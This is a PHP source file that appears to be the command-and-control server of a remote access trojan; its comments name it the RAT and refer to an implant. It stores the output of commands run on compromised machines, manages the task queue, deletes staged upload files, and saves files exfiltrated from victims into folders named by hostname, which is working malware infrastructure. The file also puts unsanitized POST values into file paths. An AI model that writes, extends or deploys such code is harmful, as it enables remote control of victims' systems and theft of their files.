<?php
  # Specifies character set to use
  header("Content-Type:text/html;charset=utf-8");

  # These POST parameters will be set if the implant has Standard Output or Standard Error to update in the "output" table
  if (isset($_POST["id"]) && isset($_POST["action"]) && isset($_POST["secondary"]))
  {
    # Includes the RAT configuration file
    include "config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));

    $taskID = $_POST["id"];                           # This will never have spaces or special characters so no need to urldecode()
    $taskAction = $_POST["action"];                   # This will never have spaces or special characters so need to urldecode()
    $taskSecondary = urldecode($_POST["secondary"]);  # Could have spaces or special characters so we urldecode()

    # If the task is a remote file upload
    if ($taskAction == "upload")
    {
      # Updates status to "Y" in "output" table
      # This informs the RAT user that the task completed
      $statement = $dbConnection->prepare("UPDATE output SET status = :status WHERE id = :id AND action = :action AND secondary = :secondary");
      $statement->bindValue(":status", "Y");
      $statement->bindValue(":id", $taskID);
      $statement->bindValue(":action", $taskAction);
      $statement->bindValue(":secondary", $taskSecondary);
      $statement->execute();

      # Deletes task
      $statement = $dbConnection->prepare("DELETE FROM tasks WHERE id = :id AND action = :action AND secondary = :secondary");
      $statement->bindValue(":id", $taskID);
      $statement->bindValue(":action", $taskAction);
      $statement->bindValue(":secondary", $taskSecondary);
      $statement->execute();

      # Kills database connection
      $statement->connection = null;

      # Deletes file so no one else can access it
      unlink("/var/www/html" . $taskSecondary);
    }
    # Else if the task action is command execution
    elseif ($taskAction == "command")
    {
      $output = urldecode($_POST["output"]);           # Could have spaces or special characters so we urldecode()
      $error = urldecode($_POST["error"]);             # Could have spaces or special characters so we urldecode()

      # Updates "output" table with Standard Output
      $statement = $dbConnection->prepare("UPDATE output SET stdout = :stdout WHERE id = :id AND action = :action AND secondary = :secondary");
      $statement->bindValue(":stdout", $output);
      $statement->bindValue(":id", $taskID);
      $statement->bindValue(":action", $taskAction);
      $statement->bindValue(":secondary", $taskSecondary);
      $statement->execute();

      # Updates "output" table with Standard Error
      $statement = $dbConnection->prepare("UPDATE output SET stderr = :stderr WHERE id = :id AND action = :action AND secondary = :secondary");
      $statement->bindValue(":stderr", $error);
      $statement->bindValue(":id", $taskID);
      $statement->bindValue(":action", $taskAction);
      $statement->bindValue(":secondary", $taskSecondary);
      $statement->execute();

      # Updates status to "Y" in "output" table
      # This informs the RAT user that the task completed
      $statement = $dbConnection->prepare("UPDATE output SET status = :status WHERE id = :id AND action = :action AND secondary = :secondary");
      $statement->bindValue(":status", "Y");
      $statement->bindValue(":id", $taskID);
      $statement->bindValue(":action", $taskAction);
      $statement->bindValue(":secondary", $taskSecondary);
      $statement->execute();

      # Deletes task from "task" table       
      $statement = $dbConnection->prepare("DELETE FROM tasks WHERE id = :id AND action = :action AND secondary = :secondary");
      $statement->bindValue(":id", $taskID);
      $statement->bindValue(":action", $taskAction);
      $statement->bindValue(":secondary", $taskSecondary);
      $statement->execute();

      # Kills database connection
      $statement->connection = null;
    }
    # Else if the task action is a remote file download
    elseif ($taskAction == "download")
    {
      $hostname = $_POST["hostname"]; # Stores hostname

      # Does the downloads/<SYSTEM> directory exist?
      # If not we create the directory
      if (!file_exists($downloadsPath . $hostname))
      {
        mkdir($downloadsPath . $hostname);
      }

      # Moves uploaded file from the /tmp directory to the downloads/<SYSTEM> directory
      $filename = $_FILES["download"]["name"];
      $tempFilePath = $_FILES["download"]["tmp_name"];
      $fileDestination = $downloadsPath . $hostname . "/" . $filename;
      move_uploaded_file($tempFilePath, $fileDestination);

      # Updates status to "Y" in "output" table
      # This informs the RAT user that the task completed
      $statement = $dbConnection->prepare("UPDATE output SET status = :status WHERE id = :id AND action = :action AND secondary = :secondary");
      $statement->bindValue(":status", "Y");
      $statement->bindValue(":id", $taskID);
      $statement->bindValue(":action", $taskAction);
      $statement->bindValue(":secondary", $taskSecondary);
      $statement->execute();

      # Deletes task
      $statement = $dbConnection->prepare("DELETE FROM tasks WHERE id = :id AND action = :action AND secondary = :secondary");
      $statement->bindValue(":id", $taskID);
      $statement->bindValue(":action", $taskAction);
      $statement->bindValue(":secondary", $taskSecondary);
      $statement->execute();

      # Kills database connection
      $statement->connection = null;
    }
  }
?>
